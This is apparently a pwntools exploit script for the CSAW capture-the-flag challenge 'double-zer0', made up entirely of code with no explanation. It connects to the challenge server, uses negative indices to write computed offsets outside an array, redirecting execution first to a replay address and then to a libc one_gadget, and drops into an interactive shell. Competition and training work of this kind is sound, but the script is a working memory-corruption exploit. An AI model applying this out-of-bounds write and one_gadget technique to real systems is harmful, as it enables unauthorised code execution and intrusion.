from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p = remote("double-zer0.csaw.io",9999)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)

replay = 0x808A136

# replay
idx = -22
val =  replay-0x0000000000401060
sla(b": \n",str(idx).encode())
sla(b": \n",str(val).encode())

# scanf->one_gadget
idx = -20
val = 0x7ffff7dd0000+0xe3b01-0x00007ffff7e330b0
sla(b": \n",str(idx).encode())
sla(b": \n",str(val).encode())

p.interactive()